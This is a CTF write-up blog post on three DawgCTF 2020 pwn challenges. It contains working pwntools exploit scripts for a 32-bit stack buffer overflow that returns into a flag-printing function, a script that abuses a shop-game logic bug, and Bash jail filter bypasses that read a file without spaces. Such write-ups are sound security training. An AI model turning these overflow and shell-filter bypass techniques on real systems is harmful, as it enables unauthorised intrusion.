---
title: DawgCTF 2020: a few pwn writeups
slug: dawg-2020-pwn
date: 13/04/2020
---

Yesterday I spent a couple of hours on the [DawgCTF 2020](https://umbccd.io/).
I only had time to work on a few pwn tasks. The challenges were nothing special
but I wrote two [pwntools](https://github.com/Gallopsled/pwntools) scripts that
might be worth sharing.

All challenges are remote.


## Bof To The Top

This is a standard buffer overflow. Source code for the vulnerable binary was
given:

```c
#include "stdio.h"
#include "string.h"
#include "stdlib.h"

// gcc -m32 -fno-stack-protector -no-pie bof.c -o bof

void audition(int time, int room_num){
	char* flag = "/bin/cat flag.txt";
	if(time == 1200 && room_num == 366){
		system(flag);
	}
}

void get_audition_info(){
	char name[50];
	char song[50];
	printf("What's your name?\n");
	gets(name);
	printf("What song will you be singing?\n");
	gets(song);
}

void welcome(){
	printf("Welcome to East High!\n");
	printf("We're the Wildcats and getting ready for our spring musical\n");
	printf("We're now accepting signups for auditions!\n");
}

int main(){
	welcome();
	get_audition_info();
	return 0;
}
```

There is a comment that tells us how the binary was compiled. It is a 32-bit,
with no PIE and stack protection disable. We have no information regarding ASLR
but this challenge is not worth many point so we guess it is disabled.

The `get_audition_info` function is the vulnerable one. Indeed, `gets` is
insecure and leads to a stack-based buffer overflow. Lucky us, we will not even
have to inject a shellcode or anything in memory as we can use the `audition`
function that can `cat` the flag for us.

But there is something else! The `audition` function, that we plan to jump to,
receives two parameters. These two `int` variables must have a specific value,
otherwise `system` will not be called for us. One could think that we can
directly jump to the `system` call, that must be located at
`audition+something`, but this is not possible as `flag` will not be
initialized and `system` will be called with a bad pointer as parameter.

We definitely need to pass the `time` and `room` parameters. In order to do so,
we can prepare a payload that is similar to ret2libc. A standard ret2libc
payload looks like so: `AAAAAAAAAA...AAAAAA + SYSTEM_ADDR + RET_ADDR +
BIN_SH_ADDR`. First, there is enough data to reach `EIP`. Then, we overwrite
`EIP` with the address of the function we want to jump to. Finally, we add a
return address (a fake `EIP` save), and our parameters.

Here is the exploit script:

```python
from pwn import *


DEBUG = False

if not DEBUG:
    r = remote(
        host='ctf.umbccd.io',
        port=4000
    )
else:
    r = process([
        'gdb', '-q',
        '/macOS/bof',
    ])

audition = 0x08049182  # Found using nm (one could use pwn.elf too)
tiime = 1200  # First parameter
room_num = 366  # Second parameter

smash_after = 62  # Can be found using pwn.cyclic
payload = b'A' * smash_after + p32(audition) + b'LOOL' + p32(tiime) + p32(room_num)

if DEBUG:
    # r.sendline('b * 0x0804921d')
    r.sendline('r')

log.info(r.recvuntil('name?\n'))
r.sendline(payload)  # When the overflow happens

log.info(r.recvuntil('ing?\n'))
r.sendline('whocares')  # We don't care about the second buffer

if DEBUG:
    r.interactive()
else:
    log.success(r.recvline().decode())  # Outputs the flag
```

The offsets are strictly the same locally and remotely. Also, our guess turned
out correct as there is no ASLR. We get our flag immediately:

```
[+] Opening connection to ctf.umbccd.io on port 4000: Done
[*] b"Welcome to East High!\nWe're the Wildcats and getting ready for our spring musical\nWe're now accepting signups for auditions!\nWhat's your name?\n"
[*] b'What song will you be singing?\n'
[+] DawgCTF{wh@t_teAm?}
```


## Nash

This challenge is some kind of Bash jail. There is a `flag.txt` file in the
current directory. We have to find a way to read it **without using any
space**, as they are stripped from our input.

The first thing that came to my mind is the [`IFS` trick](https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces):

```
nash> cat${IFS}flag.txt`
```
Unfortunately, `IFS` is not set, and the `{}` are also stripped. A few
Google searchs later, I found another payload:

```
nash> `<flag.txt`
/bin/bash: line 1: DawgCTF{L1k3_H0W_gr3a+_R_sp@c3s_Th0uGh_0mg}: command not found
```

I'm not a Bash guy but from what I understand, the `<` allows to retrieve the
content of `flag.txt`. Then, the backticks introduce a subcommand. Thus, Bash
tries to run a command that is our flag.


## Tom Nook the Capitalist Raccoon

This is an Animal Crossing themed challenge. We can do some business with our
good friend Tom Nook, trading tarantulas for bells... But the only thing that
we really want to buy is the flag. Which costs 420000 bells. That is a lot.

We will not be able to make that much money the legal way so let's be an
average Animal Crossing player and cheat.

Source code is not provided but we have the [compiled binary](https://github.com/toomanybananas/dawgctf-2020-writeups/raw/master/pwn/animal_crossing/animal_crossing).
To be honest, I did not even have to reverse it as I found the bug just by
playing with the remote instance. The actual C source code is [available here](https://github.com/toomanybananas/dawgctf-2020-writeups/blob/master/pwn/animal_crossing/animal_crossing.c)
if you want to make an extended study.

The bug is as follows:

* The game starts
* You buy an item (let's say a tarantula, as it is worth a lot)
* Your inventory is now full
* You sell the tarantula
* It is not removed from you inventory, but you get the bells
* You sell the tarantula
* It is not removed from your inventory, but you get the bells
* ...
* You sell any other item to free some inventory space
* You buy the flag

```python
from pwn import *


r = remote(
    host='ctf.umbccd.io',
    port=4400
)

# Buy
log.info(r.recvuntil('Choice: ').decode())
r.sendline('2')

# A tarantula
log.info(r.recvuntil('\n').decode())
r.sendline('2')

# Inventory is now full

# Sell A LOT of tarantulas
for i in range(100):
    log.info(r.recvuntil('Choice: ').decode())
    r.sendline('1')
    log.info(r.recvuntil('\n').decode())
    r.sendline('5')

# You are now rich

# Sell random item to free some space
log.info(r.recvuntil('Choice: ').decode())
r.sendline('1')
log.info(r.recvuntil('\n').decode())
r.sendline('1')

# Buy flag
log.info(r.recvuntil('Choice: ').decode())
r.sendline('2')
log.info(r.recvuntil('\n').decode())
r.sendline('6')

# Display inventory in order to display flag
log.info(r.recvuntil('Choice: ').decode())
r.sendline('1')
log.info(r.recvuntil('\n').decode())
r.sendline('1')

r.interactive()
```

Tom Nook is not amused.

![Angry Tom Nook](assets/dawg-2020/nook.png)


## Wrapping up

Too bad I could not spend much more time on this CTF. The organizers
published [all the challenges](https://github.com/toomanybananas/dawgctf-2020-writeups)
for us to replay at home fortunately.
